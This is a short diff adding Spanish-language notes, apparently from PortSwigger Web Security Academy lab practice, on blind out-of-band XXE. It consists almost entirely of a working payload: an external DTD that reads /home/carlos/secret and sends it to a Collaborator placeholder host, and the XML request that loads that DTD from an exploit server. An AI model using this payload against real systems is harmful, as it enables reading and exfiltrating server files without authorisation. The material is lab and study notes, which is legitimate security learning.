@@ -1,3 +1,15 @@
+###### Blind OOB-XXE en SQLi: (/exploit.dtd)
+```js
+<!ENTITY % file SYSTEM "file:///home/carlos/secret"> <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://[TU_ID_COLLABORATOR].oastify.com/?x=%file;'>"> 
+%eval; 
+%exfil;
+```
+
+```js
+<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://[ID_TU_EXPLOIT_SERVER].web-security-academy.net/exploit.dtd"> %xxe;]> <stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
+```
+
+---
 
 #SQLi
 ```xml
